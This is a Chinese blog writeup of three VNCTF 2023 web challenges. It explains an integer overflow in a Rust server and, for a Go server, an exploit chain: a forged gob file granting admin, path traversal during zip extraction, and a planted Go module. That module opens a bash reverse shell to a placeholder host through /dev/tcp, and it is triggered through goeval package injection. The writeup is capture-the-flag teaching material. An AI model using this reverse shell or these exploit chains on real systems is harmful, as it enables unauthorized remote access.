---
title: "VNCTF 2023 Web 部分 Writeup"
date: 2023-02-19T21:02:00+08:00
lastmod: 2023-02-19T21:02:00+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

VNCTF 2023

<!--more-->

## 象棋王子

右键查看源码得到 flag

## 电子木鱼

main.rs

```rust
use actix_files::Files;
use actix_web::{
    error, get, post,
    web::{self, Json},
    App, Error, HttpResponse, HttpServer,
};
use once_cell::sync::Lazy;
use serde::{Deserialize, Serialize};
use std::sync::{Arc, Mutex};
use tera::{Context, Tera};

static GONGDE: Lazy<ThreadLocker<i32>> = Lazy::new(|| ThreadLocker::from(0));

#[derive(Debug, Clone, Default)]
struct ThreadLocker<T> {
    value: Arc<Mutex<T>>,
}

impl<T: Clone> ThreadLocker<T> {
    fn get(&self) -> T {
        let mutex = self.value.lock().unwrap();
        mutex.clone()
    }
    fn set(&self, val: T) {
        let mut mutex = self.value.lock().unwrap();
        *mutex = val;
    }
    fn from(val: T) -> ThreadLocker<T> {
        ThreadLocker::<T> {
            value: Arc::new(Mutex::new(val)),
        }
    }
}

#[derive(Serialize)]
struct APIResult {
    success: bool,
    message: &'static str,
}

#[derive(Deserialize)]
struct Info {
    name: String,
    quantity: i32,
}

#[derive(Debug, Copy, Clone, Serialize)]
struct Payload {
    name: &'static str,
    cost: i32,
}

const PAYLOADS: &[Payload] = &[
    Payload {
        name: "Cost",
        cost: 10,
    },
    Payload {
        name: "Loan",
        cost: -1_000,
    },
    Payload {
        name: "CCCCCost",
        cost: 500,
    },
    Payload {
        name: "Donate",
        cost: 1,
    },
    Payload {
        name: "Sleep",
        cost: 0,
    },
];

#[get("/")]
async fn index(tera: web::Data<Tera>) -> Result<HttpResponse, Error> {
    let mut context = Context::new();

    context.insert("gongde", &GONGDE.get());

    if GONGDE.get() > 1_000_000_000 {
        context.insert(
            "flag",
            &std::env::var("FLAG").unwrap_or_else(|_| "flag{test_flag}".to_string()),
        );
    }

    match tera.render("index.html", &context) {
        Ok(body) => Ok(HttpResponse::Ok().body(body)),
        Err(err) => Err(error::ErrorInternalServerError(err)),
    }
}

#[get("/reset")]
async fn reset() -> Json<APIResult> {
    GONGDE.set(0);
    web::Json(APIResult {
        success: true,
        message: "重开成功，继续挑战佛祖吧",
    })
}

#[post("/upgrade")]
async fn upgrade(body: web::Form<Info>) -> Json<APIResult> {
    if GONGDE.get() < 0 {
        return web::Json(APIResult {
            success: false,
            message: "功德都搞成负数了，佛祖对你很失望",
        });
    }

    if body.quantity <= 0 {
        return web::Json(APIResult {
            success: false,
            message: "佛祖面前都敢作弊，真不怕遭报应啊",
        });
    }

    if let Some(payload) = PAYLOADS.iter().find(|u| u.name == body.name) {
        let mut cost = payload.cost;

        if payload.name == "Donate" || payload.name == "Cost" {
            cost *= body.quantity;
        }

        if GONGDE.get() < cost as i32 {
            return web::Json(APIResult {
                success: false,
                message: "功德不足",
            });
        }

        if cost != 0 {
            GONGDE.set(GONGDE.get() - cost as i32);
        }

        if payload.name == "Cost" {
            return web::Json(APIResult {
                success: true,
                message: "小扣一手功德",
            });
        } else if payload.name == "CCCCCost" {
            return web::Json(APIResult {
                success: true,
                message: "功德都快扣没了，怎么睡得着的",
            });
        } else if payload.name == "Loan" {
            return web::Json(APIResult {
                success: true,
                message: "我向佛祖许愿，佛祖借我功德，快说谢谢佛祖",
            });
        } else if payload.name == "Donate" {
            return web::Json(APIResult {
                success: true,
                message: "好人有好报",
            });
        } else if payload.name == "Sleep" {
            return web::Json(APIResult {
                success: true,
                message: "这是什么？床，睡一下",
            });
        }
    }

    web::Json(APIResult {
        success: false,
        message: "禁止开摆",
    })
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    let port = std::env::var("PORT")
        .unwrap_or_else(|_| "2333".to_string())
        .parse()
        .expect("Invalid PORT");

    println!("Listening on 0.0.0.0:{}", port);

    HttpServer::new(move || {
        let tera = match Tera::new("src/templates/**/*.html") {
            Ok(t) => t,
            Err(e) => {
                println!("Error: {}", e);
                ::std::process::exit(1);
            }
        };
        App::new()
            .app_data(web::Data::new(tera))
            .service(Files::new("/asset", "src/templates/asset/").prefer_utf8(true))
            .service(index)
            .service(upgrade)
            .service(reset)
    })
    .bind(("0.0.0.0", port))?
    .run()
    .await
}
```

[https://carljin.com/rust-data-types-comparison](https://carljin.com/rust-data-types-comparison)

i32 的范围是 `-2147483648~2147483647`

`/upgrade` 传入 `name=Cost&quantity=2147483647` 的时候发现功德加了 10, 所以这里应该存在整数溢出问题

懒得算了, 把 2147483647 改成 1147483647 就能拿到 flag

![image-20230218171925710](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302181719784.png)

![image-20230218171932795](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302181719867.png)

## BabyGo

main.go

```go
package main

import (
	"encoding/gob"
	"fmt"
	"github.com/PaulXu-cn/goeval"
	"github.com/duke-git/lancet/cryptor"
	"github.com/duke-git/lancet/fileutil"
	"github.com/duke-git/lancet/random"
	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

type User struct {
	Name  string
	Path  string
	Power string
}

func main() {
	r := gin.Default()
	store := cookie.NewStore(random.RandBytes(16))
	r.Use(sessions.Sessions("session", store))
	r.LoadHTMLGlob("template/*")

	r.GET("/", func(c *gin.Context) {
		userDir := "/tmp/" + cryptor.Md5String(c.ClientIP()+"VNCTF2023GoGoGo~") + "/"
		session := sessions.Default(c)
		session.Set("shallow", userDir)
		session.Save()
		fileutil.CreateDir(userDir)
		gobFile, _ := os.Create(userDir + "user.gob")
		user := User{Name: "ctfer", Path: userDir, Power: "low"}
		encoder := gob.NewEncoder(gobFile)
		encoder.Encode(user)
		if fileutil.IsExist(userDir) && fileutil.IsExist(userDir+"user.gob") {
			c.HTML(200, "index.html", gin.H{"message": "Your path: " + userDir})
			return
		}
		c.HTML(500, "index.html", gin.H{"message": "failed to make user dir"})
	})

	r.GET("/upload", func(c *gin.Context) {
		c.HTML(200, "upload.html", gin.H{"message": "upload me!"})
	})

	r.POST("/upload", func(c *gin.Context) {
		session := sessions.Default(c)
		if session.Get("shallow") == nil {
			c.Redirect(http.StatusFound, "/")
		}
		userUploadDir := session.Get("shallow").(string) + "uploads/"
		fileutil.CreateDir(userUploadDir)
		file, err := c.FormFile("file")
		if err != nil {
			c.HTML(500, "upload.html", gin.H{"message": "no file upload"})
			return
		}
		ext := file.Filename[strings.LastIndex(file.Filename, "."):]
		if ext == ".gob" || ext == ".go" {
			c.HTML(500, "upload.html", gin.H{"message": "Hacker!"})
			return
		}
		filename := userUploadDir + file.Filename
		if fileutil.IsExist(filename) {
			fileutil.RemoveFile(filename)
		}
		err = c.SaveUploadedFile(file, filename)
		if err != nil {
			c.HTML(500, "upload.html", gin.H{"message": "failed to save file"})
			return
		}
		c.HTML(200, "upload.html", gin.H{"message": "file saved to " + filename})
	})

	r.GET("/unzip", func(c *gin.Context) {
		session := sessions.Default(c)
		if session.Get("shallow") == nil {
			c.Redirect(http.StatusFound, "/")
		}
		userUploadDir := session.Get("shallow").(string) + "uploads/"
		files, _ := fileutil.ListFileNames(userUploadDir)
		destPath := filepath.Clean(userUploadDir + c.Query("path"))
		for _, file := range files {
			if fileutil.MiMeType(userUploadDir+file) == "application/zip" {
				err := fileutil.UnZip(userUploadDir+file, destPath)
				if err != nil {
					c.HTML(200, "zip.html", gin.H{"message": "failed to unzip file"})
					return
				}
				fileutil.RemoveFile(userUploadDir + file)
			}
		}
		c.HTML(200, "zip.html", gin.H{"message": "success unzip"})
	})

	r.GET("/backdoor", func(c *gin.Context) {
		session := sessions.Default(c)
		if session.Get("shallow") == nil {
			c.Redirect(http.StatusFound, "/")
		}
		userDir := session.Get("shallow").(string)
		if fileutil.IsExist(userDir + "user.gob") {
			file, _ := os.Open(userDir + "user.gob")
			decoder := gob.NewDecoder(file)
			var ctfer User
			decoder.Decode(&ctfer)
			if ctfer.Power == "admin" {
				eval, err := goeval.Eval("", "fmt.Println(\"Good\")", c.DefaultQuery("pkg", "fmt"))
				if err != nil {
					fmt.Println(err)
				}
				c.HTML(200, "backdoor.html", gin.H{"message": string(eval)})
				return
			} else {
				c.HTML(200, "backdoor.html", gin.H{"message": "low power"})
				return
			}
		} else {
			c.HTML(500, "backdoor.html", gin.H{"message": "no such user gob"})
			return
		}
	})

	r.Run(":80")
}
```

首先用 `encoding/gob` 包序列化出来一个 Power 为 `admin` 的 user.gob 文件

```go
package main

import (
	"encoding/gob"
	"os"
)

type User struct {
	Name  string
	Path  string
	Power string
}

func main() {
	userDir := "/tmp/9b092f66e8abae6ee9fad54bb7b23b59/"
	gobFile, _ := os.Create("user.gob")
	user := User{Name: "ctfer", Path: userDir, Power: "admin"}
	encoder := gob.NewEncoder(gobFile)
	encoder.Encode(user)
}
```

`filepath.Clean(userUploadDir + c.Query("path"))` 这句可以用 `..` 进行目录穿越, 让生成的 user.gob 解压到 userDir

然后题目开启了 module 模式, 必须强制使用 go.mod (? Go 语言不太懂)

![image-20230218165745660](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302181658558.png)

GOPATH 不清楚, 但是能爆出来 GOROOT 的路径为 `/usr/local/go/src`![image-20230218165909498](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302181659568.png)

所以尝试把恶意模块写到 GOROOT 里面

```
fmtx
├── fmtx.go
└── go.mod
```

fmtx.go

```go
package fmtx

import (
	"os/exec"
)

func Println(text string) {
	command := exec.Command("bash", "-c", "bash -i &> /dev/tcp/x.x.x.x/yyyy 0>&1")
	err := command.Run()
	if err != nil {

	}
}
```

go.mod

```go
module fmtx

go 1.13
```

然后 pkg 传入 `fmt fmtx`, 这样 `github.com/PaulXu-cn/goeval` 在处理的时候就会把它变成 `fmt "fmtx"` 的形式, 类似 python 中的 `import xx as yyy`

过一遍流程

![image-20230218170600854](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302181706937.png)

![image-20230218170607471](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302181706553.png)

![image-20230218171321665](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302181713740.png)

![image-20230218170623539](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302181706611.png)

![image-20230218170650705](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302181706784.png)

![image-20230218170724798](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302181707842.png)